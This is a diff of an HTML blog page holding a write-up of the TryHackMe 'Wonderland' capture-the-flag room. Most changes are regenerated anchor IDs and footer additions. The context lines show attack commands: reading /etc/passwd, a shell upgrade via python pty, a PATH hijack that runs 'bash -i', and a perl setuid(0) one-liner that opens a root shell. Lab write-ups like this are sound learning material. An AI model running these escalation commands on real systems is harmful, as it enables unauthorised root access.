@@ -6,7 +6,7 @@
 <title>THM: Wonderland</title>
 <meta name="author" content="Lamprinos Chatziioannou" />
 <meta name="generator" content="Org Mode" />
-<link rel="preconnect" href="https://fonts.googleapis.com"> <link href="https://fonts.googleapis.com/css2?family=Fira+Sans&display=swap" rel="stylesheet"> <link href="https://fonts.googleapis.com/css2?family=Roboto+Condensed&display=swap" rel="stylesheet"> <script src="https://cdn.jsdelivr.net/gh/oyvindstegard/ox-tagfilter-js/ox-tagfilter.js"></script> <link rel="stylesheet" href="/src/rougier.css" /> <script src="/src/copy-pre.js"></script> <link rel="icon" type="image/x-icon" href="/src/favicon.ico"> <meta charset="UTF-8" name="viewport" content="width=device-width, initial-scale=1.0"> <!-- Google tag (gtag.js) --> <script async src="https://www.googletagmanager.com/gtag/js?id=G-55X4GXWBKS"></script> <script> window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', 'G-55X4GXWBKS'); </script>
+<link rel="preconnect" href="https://fonts.googleapis.com"> <link href="https://fonts.googleapis.com/css2?family=Fira+Sans&display=swap" rel="stylesheet"> <link href="https://fonts.googleapis.com/css2?family=Roboto+Condensed&display=swap" rel="stylesheet"> <script src="https://cdn.jsdelivr.net/gh/oyvindstegard/ox-tagfilter-js/ox-tagfilter.js"></script> <link rel="stylesheet" href="/src/rougier.css" /> <script src="/src/copy-pre.js"></script> <link rel="icon" type="image/x-icon" href="/src/favicon.ico"> <meta charset="UTF-8" name="viewport" content="width=device-width, initial-scale=1.0"> <!-- Google tag (gtag.js) --> <script async src="https://www.googletagmanager.com/gtag/js?id=G-55X4GXWBKS"></script> <script> window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', 'G-55X4GXWBKS'); </script><script src="https://kit.fontawesome.com/78d5a086dd.js" crossorigin="anonymous"></script>
 </head>
 <body>
 <div id="org-div-home-and-up">
@@ -19,23 +19,23 @@
 <h2>Table of Contents</h2>
 <div id="text-table-of-contents" role="doc-toc">
 <ul>
-<li><a href="#orge035d28">Recon</a>
+<li><a href="#orgbf88d69">Recon</a>
 <ul>
-<li><a href="#orgefefbed">Web Server</a></li>
+<li><a href="#orgedb69df">Web Server</a></li>
 </ul>
 </li>
-<li><a href="#orge5c58ef">Alice</a></li>
-<li><a href="#orgcb89594">Hopping away</a></li>
-<li><a href="#org02cedb0">Hatter</a></li>
-<li><a href="#org85a0317">Privilege Escalation through <code>suid</code> capability</a></li>
-<li><a href="#org060f132">Summing up</a></li>
+<li><a href="#org005e1fa">Alice</a></li>
+<li><a href="#org2cdc838">Hopping away</a></li>
+<li><a href="#org36390c5">Hatter</a></li>
+<li><a href="#org46aa13f">Privilege Escalation through <code>suid</code> capability</a></li>
+<li><a href="#org9791b70">Summing up</a></li>
 </ul>
 </div>
 </div>
 
-<div id="outline-container-orge035d28" class="outline-2">
-<h2 id="orge035d28"><a href="#orge035d28">Recon</a></h2>
-<div class="outline-text-2" id="text-orge035d28">
+<div id="outline-container-orgbf88d69" class="outline-2">
+<h2 id="orgbf88d69"><a href="#orgbf88d69">Recon</a></h2>
+<div class="outline-text-2" id="text-orgbf88d69">
 <p>
 The initial nmap scan gives us some starting info:
 </p>
@@ -59,9 +59,9 @@ Before moving on to the web-server analysis:
 </div>
 </div>
 
-<div id="outline-container-orgefefbed" class="outline-3">
-<h3 id="orgefefbed"><a href="#orgefefbed">Web Server</a></h3>
-<div class="outline-text-3" id="text-orgefefbed">
+<div id="outline-container-orgedb69df" class="outline-3">
+<h3 id="orgedb69df"><a href="#orgedb69df">Web Server</a></h3>
+<div class="outline-text-3" id="text-orgedb69df">
 <p>
 Just by visiting the website we notice that:
 </p>
@@ -103,22 +103,22 @@ Testing it and&#x2026;we have access as <code>alice</code>
 </div>
 </div>
 </div>
-<div id="outline-container-orge5c58ef" class="outline-2">
-<h2 id="orge5c58ef"><a href="#orge5c58ef">Alice</a></h2>
-<div class="outline-text-2" id="text-orge5c58ef">
+<div id="outline-container-org005e1fa" class="outline-2">
+<h2 id="org005e1fa"><a href="#org005e1fa">Alice</a></h2>
+<div class="outline-text-2" id="text-org005e1fa">
 <p>
 Strangely enough, good ol&rsquo; find does not give us the position of
 <code>user.txt</code>, hinting that we will have to login as a different user in
 order to get it.
 </p>
-<pre class="example" id="org1e003c6">
+<pre class="example" id="org9da056e">
 alice@wonderland:/$ find . -name user.txt 2&gt;/dev/null
 </pre>
 
 <p>
 The different users, as listed by <code>cat /etc/passwd</code>:
 </p>
-<pre class="example" id="orgd52be07">
+<pre class="example" id="orgea2a13a">
 root:x:0:0:root:/root:/bin/bash
 tryhackme:x:1000:1000:tryhackme:/home/tryhackme:/bin/bash
 alice:x:1001:1001:Alice Liddell,,,:/home/alice:/bin/bash
@@ -131,7 +131,7 @@ rabbit:x:1002:1002:White Rabbit,,,:/home/rabbit:/bin/bash
 <code>rabbit</code> (while being alice):
 </p>
 
-<pre class="example" id="orgab6c4eb">
+<pre class="example" id="org255384e">
 User alice may run the following commands on wonderland:
     (rabbit) /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py
 </pre>
@@ -166,15 +166,15 @@ settling for a netcat one that got the job done
 </div>
 </div>
 
-<div id="outline-container-orgcb89594" class="outline-2">
-<h2 id="orgcb89594"><a href="#orgcb89594">Hopping away</a></h2>
-<div class="outline-text-2" id="text-orgcb89594">
+<div id="outline-container-org2cdc838" class="outline-2">
+<h2 id="org2cdc838"><a href="#org2cdc838">Hopping away</a></h2>
+<div class="outline-text-2" id="text-org2cdc838">
 <p>
 After receiving the reverse shell in my netcat listener, the interface
 was sadly unusable, so I had to <i>spice it up</i> with some simple python:
 </p>
 <div class="org-src-container">
-<pre class="src src-bash" id="orga51ebff">python3.6 -c 'import pty; pty.spawn("/bin/bash")' # python can not be found in the path
+<pre class="src src-bash" id="orgc425fa8">python3.6 -c 'import pty; pty.spawn("/bin/bash")' # python can not be found in the path
 </pre>
 </div>
 
@@ -198,7 +198,7 @@ replacing it with a reverse shell  maybe or sh itself?
 The second option worked just fine with <code>bash -i</code>:
 </p>
 <div class="org-src-container">
-<pre class="src src-bash" id="org32f8852">PATH="/home/rabbit:$PATH"
+<pre class="src src-bash" id="orgd39456d">PATH="/home/rabbit:$PATH"
 echo 'bash -i' &gt; date
 ./teaParty
 </pre>
@@ -212,9 +212,9 @@ easily.
 </div>
 </div>
 
-<div id="outline-container-org02cedb0" class="outline-2">
-<h2 id="org02cedb0"><a href="#org02cedb0">Hatter</a></h2>
-<div class="outline-text-2" id="text-org02cedb0">
+<div id="outline-container-org36390c5" class="outline-2">
+<h2 id="org36390c5"><a href="#org36390c5">Hatter</a></h2>
+<div class="outline-text-2" id="text-org36390c5">
 <p>
 As <code>hatter</code> there is not much I can do. In fact, this is the part of the
 room where I got impressively stuck and could not figure out what to
@@ -258,9 +258,9 @@ it!
 </div>
 </div>
 
-<div id="outline-container-org85a0317" class="outline-2">
-<h2 id="org85a0317"><a href="#org85a0317">Privilege Escalation through <code>suid</code> capability</a></h2>
-<div class="outline-text-2" id="text-org85a0317">
+<div id="outline-container-org46aa13f" class="outline-2">
+<h2 id="org46aa13f"><a href="#org46aa13f">Privilege Escalation through <code>suid</code> capability</a></h2>
+<div class="outline-text-2" id="text-org46aa13f">
 <p>
 Hidden in <code>linpeas.sh</code> output, there is the fact that in the target
 machine <code>perl</code> has the capability to <code>setuid</code>. This effectively means that
@@ -274,7 +274,7 @@ disappoint.
 </p>
 
 <div class="org-src-container">
-<pre class="src src-bash" id="org46c9ae5">/usr/bin/perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'
+<pre class="src src-bash" id="org7c73765">/usr/bin/perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'
 </pre>
 </div>
 
@@ -284,9 +284,9 @@ After that I just used <code>find</code>, to get both <code>root.txt</code> and 
 </div>
 </div>
 
-<div id="outline-container-org060f132" class="outline-2">
-<h2 id="org060f132"><a href="#org060f132">Summing up</a></h2>
-<div class="outline-text-2" id="text-org060f132">
+<div id="outline-container-org9791b70" class="outline-2">
+<h2 id="org9791b70"><a href="#org9791b70">Summing up</a></h2>
+<div class="outline-text-2" id="text-org9791b70">
 <p>
 I really liked how this room challenged me. It was not just at the
 last part, the python path hijack was a really nice technique as well!
@@ -299,7 +299,7 @@ On we go!
 </div>
 </div>
 <div id="postamble" class="status">
-<script src="https://giscus.app/client.js" data-repo="chatziiola/chatziiola.github.io" data-repo-id=x\"R_kgDOGq8p0g" data-category="Announcements" data-category-id="DIC_kwDOGq8p0s4COSFW" data-mapping="pathname" data-reactions-enabled="1" data-emit-metadata="0" data-input-position="bottom" data-theme="light" data-lang="en" data-loading="lazy" crossorigin="anonymous" async> </script> <p class=\"date footer\"> Originally created on 2023-11-06 Mon 23:49</p><p class="footer"> Made with Emacs and Org.<br>CSS theme based on the one developed by <a href="https://github.com/rougier">@rougier</a>.</p>
+<script src="https://giscus.app/client.js" data-repo="chatziiola/chatziiola.github.io" data-repo-id=x\"R_kgDOGq8p0g" data-category="Announcements" data-category-id="DIC_kwDOGq8p0s4COSFW" data-mapping="pathname" data-reactions-enabled="1" data-emit-metadata="0" data-input-position="bottom" data-theme="light" data-lang="en" data-loading="lazy" crossorigin="anonymous" async> </script> <p class=\"date footer\"> Originally created on 2023-11-06 Mon 23:49</p><p class="footer"> Made with Emacs and Org.<br>CSS theme based on the one developed by <a href="https://github.com/rougier">@rougier</a>.<br> <a href="https://github.com/chatziiola"> <i class="fa-brands fa-github"></i> </a> </p>
 </div>
 </body>
 </html>
